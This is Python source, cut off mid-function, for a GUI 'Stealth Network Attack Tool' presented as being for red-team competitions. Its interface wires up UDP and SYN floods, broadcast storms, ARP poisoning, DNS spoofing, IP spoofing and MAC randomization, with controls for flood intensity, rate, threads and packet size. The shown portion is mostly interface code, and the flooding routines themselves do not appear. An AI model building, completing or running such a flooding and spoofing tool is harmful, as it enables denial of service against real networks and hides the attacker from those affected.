#!/usr/bin/env python3
"""
Stealth Network Attack Tool - Linux Edition
Enhanced version with raw socket support, packet crafting, and advanced Linux features
For Red Team vs Blue Team competitions
"""

import tkinter as tk
from tkinter import ttk, messagebox
import socket
import random
import threading
import time
import subprocess
import os
import sys
import re
import struct
import platform

class StealthJammerLinux(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Stealth Network Attack Tool - Linux Edition (Enhanced)")
        
        # Set window to 90% of screen size
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        window_width = int(screen_width * 0.9)
        window_height = int(screen_height * 0.9)
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        self.geometry(f"{window_width}x{window_height}+{x}+{y}")
        self.resizable(True, True)
        
        # Configure colors and theme
        self.bg_color = "#0a0a0a"
        self.fg_color = "#00ff00"
        self.accent_color = "#00ff00"
        self.danger_color = "#ff0000"
        self.success_color = "#00ff00"
        self.warning_color = "#ffff00"
        
        self.configure(bg=self.bg_color)
        
        # Attack state
        self.attack_active = False
        self.intensity = 5
        self.attack_threads = []
        self.packets_sent = 0
        self.start_time = None
        self.bytes_sent = 0
        
        # Advanced customization settings
        self.packet_size_min = 512
        self.packet_size_max = 2048
        self.send_rate = 1000
        self.burst_size = 10
        self.thread_multiplier = 5
        
        # Packet preloading
        self.preloaded_packets = []
        self.preload_count = 1000
        self.preload_enabled = True
        
        # Performance monitoring
        self.last_packet_count = 0
        self.last_byte_count = 0
        self.last_update_time = time.time()
        self.current_pps = 0
        self.current_bandwidth = 0
        
        # Ping monitoring
        self.ping_target = "8.8.8.8"
        self.current_ping = 0
        self.ping_monitoring = False
        
        # Anonymity features
        self.mac_randomization = False
        self.traffic_obfuscation = True
        
        # Network info
        self.current_interface = None
        self.current_mac = None
        self.original_mac = None
        self.spoofed_ip = None
        self.spoofed_mac = None
        
        # Linux-specific features
        self.raw_socket_enabled = False
        self.use_scapy = False
        self.arp_poison_enabled = False
        self.dns_spoof_enabled = False
        self.syn_flood_raw = False
        
        # Check for root privileges
        self.is_root = self.check_root()
        
        # Check for scapy
        self.scapy_available = self.check_scapy()
        
        self.build_ui()
        self.detect_network_interface()
        
        # Start monitoring
        self.update_stats()
        self.start_ping_monitor()
        
        self.protocol("WM_DELETE_WINDOW", self.on_destroy)
    
    def check_root(self):
        """Check if running with root privileges"""
        return os.geteuid() == 0 if hasattr(os, 'geteuid') else False
    
    def check_scapy(self):
        """Check if scapy is available"""
        try:
            import scapy.all
            return True
        except ImportError:
            return False
    
    def build_ui(self):
        # Configure hacker-style theme
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure ttk styles for terminal theme
        style.configure('TFrame', background=self.bg_color)
        style.configure('TLabel', background=self.bg_color, foreground=self.fg_color)
        style.configure('TLabelframe', background=self.bg_color, foreground=self.fg_color, bordercolor=self.accent_color)
        style.configure('TLabelframe.Label', background=self.bg_color, foreground=self.accent_color, font=('Courier', 11, 'bold'))
        style.configure('TCheckbutton', background=self.bg_color, foreground=self.fg_color)
        style.configure('Header.TLabel', font=('Courier', 24, 'bold'), foreground=self.accent_color)
        style.configure('Subheader.TLabel', font=('Courier', 10), foreground=self.fg_color)
        style.configure('Stat.TLabel', font=('Courier', 12, 'bold'), foreground=self.success_color)
        
        # Main container with canvas for scrolling
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)
        
        canvas_container = tk.Frame(self, bg=self.bg_color)
        canvas_container.grid(row=0, column=0, sticky='nsew')
        canvas_container.grid_rowconfigure(0, weight=1)
        canvas_container.grid_columnconfigure(0, weight=1)
        canvas_container.grid_columnconfigure(1, weight=1)
        
        # Left canvas with scrollbar
        left_canvas = tk.Canvas(canvas_container, bg=self.bg_color, highlightthickness=0)
        left_scrollbar = ttk.Scrollbar(canvas_container, orient="vertical", command=left_canvas.yview)
        left_scrollable = ttk.Frame(left_canvas)
        
        left_scrollable.bind("<Configure>", lambda e: left_canvas.configure(scrollregion=left_canvas.bbox("all")))
        left_canvas.create_window((0, 0), window=left_scrollable, anchor="nw")
        left_canvas.configure(yscrollcommand=left_scrollbar.set)
        
        # Right canvas with scrollbar
        right_canvas = tk.Canvas(canvas_container, bg=self.bg_color, highlightthickness=0)
        right_scrollbar = ttk.Scrollbar(canvas_container, orient="vertical", command=right_canvas.yview)
        right_scrollable = ttk.Frame(right_canvas)
        
        right_scrollable.bind("<Configure>", lambda e: right_canvas.configure(scrollregion=right_canvas.bbox("all")))
        right_canvas.create_window((0, 0), window=right_scrollable, anchor="nw")
        right_canvas.configure(yscrollcommand=right_scrollbar.set)
        
        # Grid layout
        left_canvas.grid(row=0, column=0, sticky='nsew', padx=(10, 5), pady=10)
        left_scrollbar.grid(row=0, column=0, sticky='nse', padx=(0, 5))
        right_canvas.grid(row=0, column=1, sticky='nsew', padx=(5, 10), pady=10)
        right_scrollbar.grid(row=0, column=1, sticky='nse', padx=(0, 10))
        
        # Mouse wheel scrolling
        def _on_mousewheel(event, canvas):
            canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        
        left_canvas.bind_all("<Button-4>", lambda e: left_canvas.yview_scroll(-1, "units"))
        left_canvas.bind_all("<Button-5>", lambda e: left_canvas.yview_scroll(1, "units"))
        right_canvas.bind_all("<Button-4>", lambda e: right_canvas.yview_scroll(-1, "units"))
        right_canvas.bind_all("<Button-5>", lambda e: right_canvas.yview_scroll(1, "units"))
        
        main_frame = ttk.Frame(left_scrollable, padding=5)
        main_frame.pack(fill='both', expand=True)
        
        right_main_frame = ttk.Frame(right_scrollable, padding=5)
        right_main_frame.pack(fill='both', expand=True)
        
        # Header
        header_frame = ttk.Frame(main_frame)
        header_frame.pack(fill='x', pady=(0, 10))
        
        title_label = ttk.Label(header_frame, text="[ STEALTH NETWORK ATTACK TOOL - LINUX ]", style='Header.TLabel')
        title_label.pack()
        
        subtitle_label = ttk.Label(header_frame, text="// Red Team Edition - Raw Socket Support //", style='Subheader.TLabel')
        subtitle_label.pack()
        
        warning_frame = tk.Frame(header_frame, bg=self.danger_color, bd=2, relief='ridge')
        warning_frame.pack(fill='x', pady=5)
        warning_label = tk.Label(warning_frame, text="[!] ROOT MODE - RAW SOCKETS ENABLED [!]" if self.is_root else "[!] USER MODE - LIMITED FEATURES [!]",
                                font=('Courier', 10, 'bold'), fg='#000000', bg=self.danger_color, pady=5)
        warning_label.pack()
        
        left_column = main_frame
        right_column = right_main_frame
        
        # Anonymity Controls
        anon_frame = ttk.LabelFrame(left_column, text="[ANONYMITY CONTROLS]", padding=15)
        anon_frame.pack(fill='x', pady=(0, 10))
        
        # MAC Randomization
        mac_frame = ttk.Frame(anon_frame)
        mac_frame.pack(fill='x', pady=5)
        ttk.Label(mac_frame, text="MAC Address Randomization", font=('Courier', 10)).pack(side='left')
        self.mac_var = tk.BooleanVar(value=False)
        self.mac_switch = ttk.Checkbutton(mac_frame, variable=self.mac_var, command=self.on_mac_toggle)
        self.mac_switch.pack(side='right')
        
        self.mac_status = ttk.Label(anon_frame, text="Current MAC: Detecting...", font=('Courier', 9))
        self.mac_status.pack(anchor='w', pady=2)
        
        mac_btn = tk.Button(anon_frame, text="[>] Generate New MAC Now", command=self.on_randomize_mac_now,
                           bg='#003300', fg=self.accent_color, font=('Courier', 9, 'bold'), 
                           relief='ridge', bd=2, cursor='hand2', activebackground='#005500')
        mac_btn.pack(fill='x', pady=5)
        
        ttk.Separator(anon_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Packet Spoofing
        spoof_label = ttk.Label(anon_frame, text="[+] IP/Port Spoofing: ACTIVE", font=('Courier', 10, 'bold'))
        spoof_label.pack(anchor='w', pady=2)
        
        self.spoof_status = ttk.Label(anon_frame, text="Spoofed IP: Generating...", font=('Courier', 9))
        self.spoof_status.pack(anchor='w', pady=2)
        
        # Traffic Obfuscation
        obfus_frame = ttk.Frame(anon_frame)
        obfus_frame.pack(fill='x', pady=5)
        ttk.Label(obfus_frame, text="Traffic Pattern Randomization", font=('Courier', 10)).pack(side='left')
        self.obfus_var = tk.BooleanVar(value=True)
        self.obfus_switch = ttk.Checkbutton(obfus_frame, variable=self.obfus_var, command=self.on_obfuscation_toggle)
        self.obfus_switch.pack(side='right')
        
        # Linux-specific Advanced Features
        linux_frame = ttk.LabelFrame(left_column, text="[LINUX ADVANCED FEATURES]", padding=15)
        linux_frame.pack(fill='x', pady=(0, 10))
        
        # Raw Socket Support
        raw_frame = ttk.Frame(linux_frame)
        raw_frame.pack(fill='x', pady=5)
        ttk.Label(raw_frame, text="Raw Socket Support (Root)", font=('Courier', 10)).pack(side='left')
        self.raw_socket_var = tk.BooleanVar(value=self.is_root)
        raw_check = ttk.Checkbutton(raw_frame, variable=self.raw_socket_var, 
                                    command=self.on_raw_socket_toggle,
                                    state='normal' if self.is_root else 'disabled')
        raw_check.pack(side='right')
        
        # Scapy Support
        scapy_frame = ttk.Frame(linux_frame)
        scapy_frame.pack(fill='x', pady=5)
        scapy_status = "Available" if self.scapy_available else "Not Installed"
        ttk.Label(scapy_frame, text=f"Scapy Packet Crafting: {scapy_status}", font=('Courier', 10)).pack(side='left')
        self.scapy_var = tk.BooleanVar(value=self.scapy_available)
        scapy_check = ttk.Checkbutton(scapy_frame, variable=self.scapy_var,
                                     command=self.on_scapy_toggle,
                                     state='normal' if self.scapy_available else 'disabled')
        scapy_check.pack(side='right')
        
        # ARP Poisoning
        arp_frame = ttk.Frame(linux_frame)
        arp_frame.pack(fill='x', pady=5)
        ttk.Label(arp_frame, text="ARP Cache Poisoning", font=('Courier', 10)).pack(side='left')
        self.arp_var = tk.BooleanVar(value=False)
        arp_check = ttk.Checkbutton(arp_frame, variable=self.arp_var,
                                   command=self.on_arp_toggle,
                                   state='normal' if (self.is_root and self.scapy_available) else 'disabled')
        arp_check.pack(side='right')
        
        # DNS Spoofing
        dns_frame = ttk.Frame(linux_frame)
        dns_frame.pack(fill='x', pady=5)
        ttk.Label(dns_frame, text="DNS Response Spoofing", font=('Courier', 10)).pack(side='left')
        self.dns_var = tk.BooleanVar(value=False)
        dns_check = ttk.Checkbutton(dns_frame, variable=self.dns_var,
                                   command=self.on_dns_toggle,
                                   state='normal' if (self.is_root and self.scapy_available) else 'disabled')
        dns_check.pack(side='right')
        
        # SYN Flood with Raw Sockets
        syn_frame = ttk.Frame(linux_frame)
        syn_frame.pack(fill='x', pady=5)
        ttk.Label(syn_frame, text="Raw SYN Flood (TCP Header Craft)", font=('Courier', 10)).pack(side='left')
        self.syn_raw_var = tk.BooleanVar(value=False)
        syn_check = ttk.Checkbutton(syn_frame, variable=self.syn_raw_var,
                                    command=self.on_syn_raw_toggle,
                                    state='normal' if self.is_root else 'disabled')
        syn_check.pack(side='right')
        
        # Attack Controls (same as Windows but with terminal theme)
        attack_frame = ttk.LabelFrame(left_column, text="[ATTACK CONTROLS]", padding=15)
        attack_frame.pack(fill='x', pady=(0, 10))
        
        self.attack_button = tk.Button(attack_frame, text="[>] INITIATE ATTACK",
                                      font=('Courier', 14, 'bold'),
                                      bg='#003300', fg=self.success_color,
                                      command=self.on_attack_toggle,
                                      height=2, relief='ridge', bd=3, cursor='hand2',
                                      activebackground='#005500')
        self.attack_button.pack(fill='x', pady=5)
        
        # Intensity presets
        preset_frame = ttk.Frame(attack_frame)
        preset_frame.pack(fill='x', pady=10)
        ttk.Label(preset_frame, text="Intensity Presets:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=5)
        
        preset_buttons = ttk.Frame(preset_frame)
        preset_buttons.pack(fill='x')
        
        for name, level in [("Low", 3), ("Medium", 5), ("High", 7), ("Maximum", 10)]:
            btn = tk.Button(preset_buttons, text=f"[{name}]", command=lambda l=level: self.on_preset_click(l),
                          bg='#001100', fg=self.accent_color, font=('Courier', 9, 'bold'), 
                          relief='ridge', bd=2, cursor='hand2', activebackground='#003300')
            btn.pack(side='left', padx=2, expand=True, fill='x')
        
        # Custom intensity
        intensity_frame = ttk.Frame(attack_frame)
        intensity_frame.pack(fill='x', pady=10)
        
        intensity_header = ttk.Frame(intensity_frame)
        intensity_header.pack(fill='x')
        ttk.Label(intensity_header, text="Custom Intensity:", font=('Courier', 10, 'bold')).pack(side='left')
        self.intensity_label = ttk.Label(intensity_header, text="Level 5 (50%)", font=('Courier', 10, 'bold'),
                                        foreground=self.accent_color)
        self.intensity_label.pack(side='right')
        
        self.intensity_var = tk.IntVar(value=5)
        self.intensity_scale = ttk.Scale(intensity_frame, from_=1, to=10,
                                        variable=self.intensity_var,
                                        orient='horizontal',
                                        command=self.on_intensity_changed)
        self.intensity_scale.pack(fill='x', pady=5)
        
        # Attack vectors
        ttk.Label(attack_frame, text="Attack Vectors:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=(10, 5))
        
        vectors_frame = ttk.Frame(attack_frame)
        vectors_frame.pack(fill='x', padx=10)
        
        self.vector_udp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(vectors_frame, text="[*] UDP Flood", variable=self.vector_udp_var).pack(anchor='w', pady=3)
        
        self.vector_tcp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(vectors_frame, text="[*] TCP SYN Flood", variable=self.vector_tcp_var).pack(anchor='w', pady=3)
        
        self.vector_broadcast_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(vectors_frame, text="[*] Broadcast Storm", variable=self.vector_broadcast_var).pack(anchor='w', pady=3)
        
        # Advanced Configuration
        advanced_frame = ttk.LabelFrame(left_column, text="[ADVANCED CONFIGURATION]", padding=15)
        advanced_frame.pack(fill='x', pady=(0, 10))
        
        # Packet Size Configuration
        ttk.Label(advanced_frame, text="Packet Size Control:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        size_container = ttk.Frame(advanced_frame)
        size_container.pack(fill='x', pady=5)
        
        size_min_frame = ttk.Frame(size_container)
        size_min_frame.pack(fill='x', pady=2)
        ttk.Label(size_min_frame, text="Min Size (bytes):", font=('Courier', 9)).pack(side='left')
        self.packet_size_min_var = tk.IntVar(value=512)
        size_min_spin = tk.Spinbox(size_min_frame, from_=64, to=1048576, increment=64,
                                   textvariable=self.packet_size_min_var, font=('Courier', 9),
                                   width=8, command=self.update_packet_size,
                                   bg='#001100', fg=self.accent_color, insertbackground=self.accent_color)
        size_min_spin.pack(side='right')
        
        size_max_frame = ttk.Frame(size_container)
        size_max_frame.pack(fill='x', pady=2)
        ttk.Label(size_max_frame, text="Max Size (bytes):", font=('Courier', 9)).pack(side='left')
        self.packet_size_max_var = tk.IntVar(value=2048)
        size_max_spin = tk.Spinbox(size_max_frame, from_=64, to=1048576, increment=64,
                                   textvariable=self.packet_size_max_var, font=('Courier', 9),
                                   width=8, command=self.update_packet_size,
                                   bg='#001100', fg=self.accent_color, insertbackground=self.accent_color)
        size_max_spin.pack(side='right')
        
        # Packet size presets
        size_preset_frame = ttk.Frame(advanced_frame)
        size_preset_frame.pack(fill='x', pady=5)
        ttk.Label(size_preset_frame, text="Size Presets:", font=('Courier', 9)).pack(side='left', padx=(0, 5))
        
        size_preset_row1 = ttk.Frame(size_preset_frame)
        size_preset_row1.pack(fill='x', pady=2)
        
        for name, min_s, max_s in [("Tiny", 64, 256), ("Small", 256, 512), ("Medium", 512, 2048)]:
            btn = tk.Button(size_preset_row1, text=name, 
                          command=lambda m=min_s, x=max_s: self.set_packet_size_preset(m, x),
                          bg='#001100', fg=self.accent_color, font=('Courier', 8, 'bold'), 
                          relief='ridge', bd=2, cursor='hand2', activebackground='#003300')
            btn.pack(side='left', padx=1, expand=True, fill='x')
        
        size_preset_row2 = ttk.Frame(size_preset_frame)
        size_preset_row2.pack(fill='x', pady=2)
        
        for name, min_s, max_s in [("Large", 2048, 8192), ("Huge", 8192, 65536), ("1 MB", 1048576, 1048576)]:
            btn = tk.Button(size_preset_row2, text=name, 
                          command=lambda m=min_s, x=max_s: self.set_packet_size_preset(m, x),
                          bg='#001100', fg=self.accent_color, font=('Courier', 8, 'bold'), 
                          relief='ridge', bd=2, cursor='hand2', activebackground='#003300')
            btn.pack(side='left', padx=1, expand=True, fill='x')
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Send Rate Configuration
        ttk.Label(advanced_frame, text="Send Rate Control:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        rate_frame = ttk.Frame(advanced_frame)
        rate_frame.pack(fill='x', pady=5)
        
        rate_header = ttk.Frame(rate_frame)
        rate_header.pack(fill='x')
        ttk.Label(rate_header, text="Packets/sec per thread:", font=('Courier', 9)).pack(side='left')
        self.rate_value_label = ttk.Label(rate_header, text="1000", font=('Courier', 9, 'bold'),
                                         foreground=self.accent_color)
        self.rate_value_label.pack(side='right')
        
        self.send_rate_var = tk.IntVar(value=1000)
        rate_scale = ttk.Scale(rate_frame, from_=100, to=10000, variable=self.send_rate_var,
                              orient='horizontal', command=self.update_send_rate)
        rate_scale.pack(fill='x', pady=2)
        
        # Rate presets
        rate_preset_frame = ttk.Frame(advanced_frame)
        rate_preset_frame.pack(fill='x', pady=5)
        ttk.Label(rate_preset_frame, text="Rate Presets:", font=('Courier', 9)).pack(side='left', padx=(0, 5))
        
        for name, rate in [("Slow", 100), ("Normal", 1000), ("Fast", 5000), ("MAX", 10000)]:
            btn = tk.Button(rate_preset_frame, text=name,
                          command=lambda r=rate: self.send_rate_var.set(r) or self.update_send_rate(r),
                          bg='#001100', fg=self.accent_color, font=('Courier', 8, 'bold'), 
                          relief='ridge', bd=2, cursor='hand2', activebackground='#003300')
            btn.pack(side='left', padx=1, expand=True, fill='x')
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Burst Size Configuration
        ttk.Label(advanced_frame, text="Burst Size:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        burst_frame = ttk.Frame(advanced_frame)
        burst_frame.pack(fill='x', pady=5)
        
        burst_header = ttk.Frame(burst_frame)
        burst_header.pack(fill='x')
        ttk.Label(burst_header, text="Packets per burst:", font=('Courier', 9)).pack(side='left')
        self.burst_value_label = ttk.Label(burst_header, text="10", font=('Courier', 9, 'bold'),
                                          foreground=self.accent_color)
        self.burst_value_label.pack(side='right')
        
        self.burst_size_var = tk.IntVar(value=10)
        burst_scale = ttk.Scale(burst_frame, from_=1, to=100, variable=self.burst_size_var,
                               orient='horizontal', command=self.update_burst_size)
        burst_scale.pack(fill='x', pady=2)
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Thread Multiplier
        ttk.Label(advanced_frame, text="Thread Multiplier:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        thread_frame = ttk.Frame(advanced_frame)
        thread_frame.pack(fill='x', pady=5)
        
        thread_header = ttk.Frame(thread_frame)
        thread_header.pack(fill='x')
        ttk.Label(thread_header, text="Threads per intensity:", font=('Courier', 9)).pack(side='left')
        self.thread_value_label = ttk.Label(thread_header, text="5x", font=('Courier', 9, 'bold'),
                                           foreground=self.accent_color)
        self.thread_value_label.pack(side='right')
        
        self.thread_multiplier_var = tk.IntVar(value=5)
        thread_scale = ttk.Scale(thread_frame, from_=1, to=20, variable=self.thread_multiplier_var,
                                orient='horizontal', command=self.update_thread_multiplier)
        thread_scale.pack(fill='x', pady=2)
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Packet Preloading
        ttk.Label(advanced_frame, text="Packet Preloading:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        preload_enable_frame = ttk.Frame(advanced_frame)
        preload_enable_frame.pack(fill='x', pady=5)
        ttk.Label(preload_enable_frame, text="Enable Preloading", font=('Courier', 9)).pack(side='left')
        self.preload_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(preload_enable_frame, variable=self.preload_var,
                       command=self.update_preload_setting).pack(side='right')
        
        preload_count_frame = ttk.Frame(advanced_frame)
        preload_count_frame.pack(fill='x', pady=2)
        ttk.Label(preload_count_frame, text="Preload Count:", font=('Courier', 9)).pack(side='left')
        self.preload_count_var = tk.IntVar(value=1000)
        preload_spin = tk.Spinbox(preload_count_frame, from_=100, to=10000, increment=100,
                                 textvariable=self.preload_count_var, font=('Courier', 9),
                                 width=8, command=self.update_preload_count,
                                 bg='#001100', fg=self.accent_color, insertbackground=self.accent_color)
        preload_spin.pack(side='right')
        
        preload_btn = tk.Button(advanced_frame, text="[>] Preload Packets Now",
                               command=self.preload_packets_now,
                               bg='#003300', fg=self.accent_color, font=('Courier', 9, 'bold'),
                               relief='ridge', bd=2, cursor='hand2', activebackground='#005500')
        preload_btn.pack(fill='x', pady=5)
        
        self.preload_status = ttk.Label(advanced_frame, text="Packets ready: 0",
                                       font=('Courier', 9), foreground=self.warning_color)
        self.preload_status.pack(anchor='w', pady=2)
        
        # Network Info
        network_frame = ttk.LabelFrame(left_column, text="[NETWORK INFORMATION]", padding=15)
        network_frame.pack(fill='x', pady=(0, 10))
        
        self.network_label = ttk.Label(network_frame, text="Interface: Detecting...", font=('Courier', 9))
        self.network_label.pack(anchor='w', pady=2)
        
        self.ping_target_frame = ttk.Frame(network_frame)
        self.ping_target_frame.pack(fill='x', pady=5)
        ttk.Label(self.ping_target_frame, text="Ping Target:", font=('Courier', 9)).pack(side='left')
        self.ping_target_entry = tk.Entry(self.ping_target_frame, font=('Courier', 9), width=15,
                                         bg='#001100', fg=self.accent_color, insertbackground=self.accent_color)
        self.ping_target_entry.insert(0, "8.8.8.8")
        self.ping_target_entry.pack(side='left', padx=5)
        self.ping_target_entry.bind('<Return>', lambda e: self.update_ping_target())
        
        root_text = "[+] Root Access: YES" if self.is_root else "[-] Root Access: NO"
        root_color = self.success_color if self.is_root else self.danger_color
        self.root_label = ttk.Label(network_frame, text=root_text, font=('Courier', 9, 'bold'),
                                    foreground=root_color)
        self.root_label.pack(anchor='w', pady=2)
        
        scapy_text = f"[+] Scapy: Available" if self.scapy_available else "[-] Scapy: Not Installed"
        scapy_color = self.success_color if self.scapy_available else self.warning_color
        self.scapy_label = ttk.Label(network_frame, text=scapy_text, font=('Courier', 9, 'bold'),
                                     foreground=scapy_color)
        self.scapy_label.pack(anchor='w', pady=2)
        
        # === RIGHT COLUMN CONTENT ===
        
        # Real-time Statistics
        stats_frame = ttk.LabelFrame(right_column, text="[REAL-TIME STATISTICS]", padding=15)
        stats_frame.pack(fill='x', pady=(0, 10))
        
        # Status
        status_container = ttk.Frame(stats_frame)
        status_container.pack(fill='x', pady=5)
        ttk.Label(status_container, text="Status:", font=('Courier', 10)).pack(side='left')
        self.status_label = ttk.Label(status_container, text="Idle", font=('Courier', 10, 'bold'),
                                     foreground=self.warning_color)
        self.status_label.pack(side='left', padx=10)
        
        # Create stats grid
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', pady=10)
        
        # Packets sent
        packets_frame = ttk.Frame(stats_grid)
        packets_frame.pack(fill='x', pady=3)
        ttk.Label(packets_frame, text="Packets Sent:", font=('Courier', 10)).pack(side='left')
        self.packets_label = ttk.Label(packets_frame, text="0", style='Stat.TLabel')
        self.packets_label.pack(side='right')
        
        # Packet rate
        pps_frame = ttk.Frame(stats_grid)
        pps_frame.pack(fill='x', pady=3)
        ttk.Label(pps_frame, text="Packet Rate:", font=('Courier', 10)).pack(side='left')
        self.rate_label = ttk.Label(pps_frame, text="0 pps", style='Stat.TLabel')
        self.rate_label.pack(side='right')
        
        # Bandwidth
        bandwidth_frame = ttk.Frame(stats_grid)
        bandwidth_frame.pack(fill='x', pady=3)
        ttk.Label(bandwidth_frame, text="Bandwidth:", font=('Courier', 10)).pack(side='left')
        self.bandwidth_label = ttk.Label(bandwidth_frame, text="0 KB/s", style='Stat.TLabel')
        self.bandwidth_label.pack(side='right')
        
        # Data sent
        data_frame = ttk.Frame(stats_grid)
        data_frame.pack(fill='x', pady=3)
        ttk.Label(data_frame, text="Data Sent:", font=('Courier', 10)).pack(side='left')
        self.data_label = ttk.Label(data_frame, text="0 KB", style='Stat.TLabel')
        self.data_label.pack(side='right')
        
        # Duration
        time_frame = ttk.Frame(stats_grid)
        time_frame.pack(fill='x', pady=3)
        ttk.Label(time_frame, text="Duration:", font=('Courier', 10)).pack(side='left')
        self.time_label = ttk.Label(time_frame, text="0s", style='Stat.TLabel')
        self.time_label.pack(side='right')
        
        # Network Performance
        perf_frame = ttk.LabelFrame(right_column, text="[NETWORK PERFORMANCE]", padding=15)
        perf_frame.pack(fill='x', pady=(0, 10))
        
        # Ping
        ping_container = ttk.Frame(perf_frame)
        ping_container.pack(fill='x', pady=3)
        ttk.Label(ping_container, text="Ping:", font=('Courier', 10)).pack(side='left')
        self.ping_label = ttk.Label(ping_container, text="Measuring...", style='Stat.TLabel')
        self.ping_label.pack(side='right')
        
        # Thread count
        threads_container = ttk.Frame(perf_frame)
        threads_container.pack(fill='x', pady=3)
        ttk.Label(threads_container, text="Active Threads:", font=('Courier', 10)).pack(side='left')
        self.threads_label = ttk.Label(threads_container, text="0", style='Stat.TLabel')
        self.threads_label.pack(side='right')
        
        # Attack Log
        log_frame = ttk.LabelFrame(right_column, text="[ACTIVITY LOG]", padding=15)
        log_frame.pack(fill='both', expand=True)
        log_frame.grid_rowconfigure(0, weight=1)
        log_frame.grid_columnconfigure(0, weight=1)
        
        # Create scrolled text widget
        log_scroll = ttk.Scrollbar(log_frame)
        log_scroll.grid(row=0, column=1, sticky='ns')
        
        self.log_text = tk.Text(log_frame, height=15, bg='#000000', fg=self.accent_color,
                               font=('Courier', 9), wrap='word', yscrollcommand=log_scroll.set)
        self.log_text.grid(row=0, column=0, sticky='nsew')
        log_scroll.config(command=self.log_text.yview)
        
        self.log_message("System initialized", "INFO")
        self.log_message("Awaiting attack configuration...", "INFO")
        if self.is_root:
            self.log_message("Root privileges detected - Full features available", "INFO")
        else:
            self.log_message("Running without root - Some features disabled", "WARNING")
        if self.scapy_available:
            self.log_message("Scapy library detected - Advanced packet crafting available", "INFO")
    
    def log_message(self, message, level="INFO"):
        """Add message to activity log"""
        timestamp = time.strftime("%H:%M:%S")
        color_map = {
            "INFO": "#00ff00",
            "WARNING": "#ffff00",
            "ERROR": "#ff0000",
            "ATTACK": "#ff00ff"
        }
        
        self.log_text.insert('end', f"[{timestamp}] ", 'timestamp')
        self.log_text.insert('end', f"[{level}] ", level)
        self.log_text.insert('end', f"{message}\n")
        
        self.log_text.tag_config('timestamp', foreground='#888888')
        self.log_text.tag_config(level, foreground=color_map.get(level, '#00ff00'))
        
        self.log_text.see('end')
        
        # Limit log size
        if int(self.log_text.index('end-1c').split('.')[0]) > 500:
            self.log_text.delete('1.0', '100.0')
    
    def update_ping_target(self):
        """Update ping target from entry"""
        new_target = self.ping_target_entry.get().strip()
        if new_target:
            self.ping_target = new_target
            self.log_message(f"Ping target changed to {new_target}", "INFO")
    
    def start_ping_monitor(self):
        """Start ping monitoring in background"""
        self.ping_monitoring = True
        threading.Thread(target=self.ping_monitor_thread, daemon=True).start()
    
    def ping_monitor_thread(self):
        """Monitor ping in background"""
        while self.ping_monitoring:
            try:
                result = subprocess.run(['ping', '-c', '1', '-W', '1', self.ping_target],
                                      capture_output=True, text=True, timeout=2)
                
                # Parse ping result
                if result.returncode == 0:
                    match = re.search(r'time=(\d+\.?\d*)\s*ms', result.stdout)
                    if match:
                        self.current_ping = int(float(match.group(1)))
                    else:
                        self.current_ping = -1
                else:
                    self.current_ping = -1
                    
            except:
                self.current_ping = -1
            
            time.sleep(2)  # Ping every 2 seconds
    
    def format_bytes(self, bytes_val):
        """Format bytes to human readable"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_val < 1024.0:
                return f"{bytes_val:.2f} {unit}"
            bytes_val /= 1024.0
        return f"{bytes_val:.2f} TB"
    
    def update_packet_size(self):
        """Update packet size settings"""
        self.packet_size_min = self.packet_size_min_var.get()
        self.packet_size_max = self.packet_size_max_var.get()
        
        # Ensure min <= max
        if self.packet_size_min > self.packet_size_max:
            self.packet_size_min_var.set(self.packet_size_max)
            self.packet_size_min = self.packet_size_max
        
        self.log_message(f"Packet size range: {self.packet_size_min}-{self.packet_size_max} bytes", "INFO")
    
    def set_packet_size_preset(self, min_size, max_size):
        """Set packet size preset"""
        self.packet_size_min_var.set(min_size)
        self.packet_size_max_var.set(max_size)
        self.update_packet_size()
    
    def update_send_rate(self, value):
        """Update send rate setting"""
        self.send_rate = int(float(value))
        self.rate_value_label.config(text=f"{self.send_rate}")
        self.log_message(f"Send rate: {self.send_rate} pps/thread", "INFO")
    
    def update_burst_size(self, value):
        """Update burst size setting"""
        self.burst_size = int(float(value))
        self.burst_value_label.config(text=f"{self.burst_size}")
        self.log_message(f"Burst size: {self.burst_size} packets", "INFO")
    
    def update_thread_multiplier(self, value):
        """Update thread multiplier setting"""
        self.thread_multiplier = int(float(value))
        self.thread_value_label.config(text=f"{self.thread_multiplier}x")
        self.log_message(f"Thread multiplier: {self.thread_multiplier}x", "INFO")
    
    def update_preload_setting(self):
        """Update preload enable/disable"""
        self.preload_enabled = self.preload_var.get()
        status = "enabled" if self.preload_enabled else "disabled"
        self.log_message(f"Packet preloading {status}", "INFO")
    
    def update_preload_count(self):
        """Update preload count"""
        self.preload_count = self.preload_count_var.get()
        self.log_message(f"Preload count: {self.preload_count} packets", "INFO")
    
    def preload_packets_now(self):
        """Preload packets into memory"""
        self.log_message("Preloading packets into memory...", "INFO")
        threading.Thread(target=self._preload_packets_thread, daemon=True).start()
    
    def _preload_packets_thread(self):
        """Thread to preload packets"""
        self.preloaded_packets = []
        
        for i in range(self.preload_count):
            # Generate random packet data
            size = random.randint(self.packet_size_min, self.packet_size_max)
            packet_data = bytes(random.getrandbits(8) for _ in range(size))
            
